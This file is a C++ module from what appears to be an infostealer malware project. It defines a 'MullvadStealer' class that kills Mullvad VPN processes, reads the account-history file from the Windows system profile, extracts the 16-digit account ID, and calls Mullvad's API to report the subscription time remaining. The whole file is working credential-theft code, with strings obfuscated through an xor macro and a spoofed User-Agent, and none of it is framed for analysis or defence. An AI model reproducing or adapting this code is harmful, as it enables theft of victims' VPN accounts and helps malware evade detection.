#pragma once


#include "../http.hpp"
#include "../result.hpp"
#include "../util.hpp"
#include "../xor.hpp"
#include "base.hpp"
#include <nlohmann/json.hpp>

class MullvadStealer : public AbstractStealer {
public:
    void steal() override {

        kill_process(xor("\"Mullvad VPN.exe\""));
        kill_process(xor("mullvad-daemon.exe"));
        kill_process(xor("mullvad.exe"));

        char* system_root = nullptr;
        size_t len = 0;
        _dupenv_s(&system_root, &len, "SystemRoot");
        std::string sys_root = system_root ? system_root : "C:\\Windows";
        if (system_root) free(system_root);

        std::string history_path = sys_root +
            xor("\\System32\\config\\systemprofile\\AppData\\Local\\Mullvad VPN\\account-history.json");

        std::string content;
        if (read_binary_file(history_path, content) != 0) return;


        std::string account_id;
        for (size_t i = 0; i < content.length(); ++i) {
            if (std::isdigit(content[i])) {
                size_t count = 0;
                while (i + count < content.length() && std::isdigit(content[i + count])) count++;
                if (count == 16) {
                    account_id = content.substr(i, count);
                    break;
                }
                i += count - 1;
            }
        }

        if (account_id.empty()) return;

        append_extra_info("Mullvad:");
        append_extra_info("  Account ID: " + account_id);


        try {
            std::string url = xor("https://api.mullvad.net/public/accounts/v1/") + account_id;
            auto resp = HTTP::get(url, {{xor("User-Agent"), xor("curl/8.4.0")}});
            if (resp.status == 200 && !resp.body.empty()) {
                auto api_json = nlohmann::json::parse(resp.body, nullptr, false);
                if (!api_json.is_discarded() && api_json.contains("expiry") &&
                    api_json["expiry"].is_string()) {
                    std::string expiry = api_json["expiry"].get<std::string>();
                    int year, month, day, hour, min, sec;
                    if (sscanf_s(expiry.c_str(), "%d-%d-%dT%d:%d:%d",
                                 &year, &month, &day, &hour, &min, &sec) == 6) {
                        std::tm tm = {};
                        tm.tm_year = year - 1900;
                        tm.tm_mon = month - 1;
                        tm.tm_mday = day;
                        tm.tm_hour = hour;
                        tm.tm_min = min;
                        tm.tm_sec = sec;
                        time_t expiry_time = _mkgmtime(&tm);
                        time_t now = time(nullptr);
                        double diff = difftime(expiry_time, now);
                        if (diff > 0) {
                            int days_left = (int)(diff / 86400);
                            int hours_left = (int)((diff - (days_left * 86400)) / 3600);
                            append_extra_info("  Time Left: " + std::to_string(days_left) +
                                              " days, " + std::to_string(hours_left) + " hours");
                        } else {
                            append_extra_info("  Time Left: expired");
                        }
                    }
                }
            }
        } catch (...) {}

        append_extra_info("");
    }
};
